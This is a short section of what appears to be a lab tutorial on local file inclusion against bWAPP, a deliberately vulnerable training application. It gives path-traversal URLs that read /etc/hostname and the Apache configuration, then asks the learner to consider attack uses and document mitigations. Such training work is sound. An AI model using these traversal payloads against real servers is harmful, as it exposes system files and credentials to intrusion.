# `04` Additional Vulnerability Exploration

Once the LFI is confirmed, explore other sensitive files on the system. Some examples include:

- bWAPP server name:

    ```bash
    http://<your_ip>/bWAPP/rlfi.php?language=../../../../etc/hostname&action=go
    ```

- Main Apache configuration:

    ```bash
    http://<your_ip>/bWAPP/rlfi.php?language=../../../../etc/apache2/apache2.conf&action=go
    ```

Finally, review the contents of the files you have successfully included. Consider how this information could be used in a real attack, such as obtaining credentials or information about the server's infrastructure.

Document the steps taken, the files accessed, and potential mitigations that could be implemented.
